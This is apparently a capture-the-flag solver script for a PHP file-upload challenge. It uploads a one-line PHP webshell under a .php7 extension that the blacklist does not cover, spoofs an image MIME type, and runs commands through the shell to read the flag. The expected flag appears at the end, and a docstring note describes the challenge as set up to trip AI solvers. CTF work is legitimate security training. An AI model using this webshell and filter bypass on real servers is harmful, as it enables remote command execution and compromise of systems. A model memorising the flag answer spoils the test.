"""
C11 Solver — Stark Upload (PHP File Upload Bypass)

The upload filter blacklists: php, php3, php4, php5, phtml
But Apache is configured to execute .php7 as PHP — NOT in the blacklist.

AI trap: AI suggests .phtml first (most well-known bypass) → blocked.
         Then tries .php5 → blocked. Never reaches .php7.

Steps:
1. Create a PHP webshell with .php7 extension
2. Upload it via the form
3. Access it to execute commands
4. Read /flag.txt
"""

import requests

TARGET = "http://<challenge-host>:<port>"

# Step 1: Create webshell payload
webshell = b"<?php system($_GET['cmd']); ?>"

# Step 2: Upload with .php7 extension
files = {'profile': ('shell.php7', webshell, 'image/jpeg')}
r = requests.post(TARGET + "/", files=files)
print("Upload response:", "success" if "successfully" in r.text else "failed")
print(r.text[r.text.find("uploads/"):r.text.find("uploads/")+40] if "uploads/" in r.text else "")

# Step 3: Execute command to read flag
shell_url = TARGET + "/uploads/shell.php7"
r2 = requests.get(shell_url, params={'cmd': 'cat /flag.txt'})
print("Flag:", r2.text.strip())
# Output: cyn0x{ph3_upl04d_f1lt3r_3vas10n}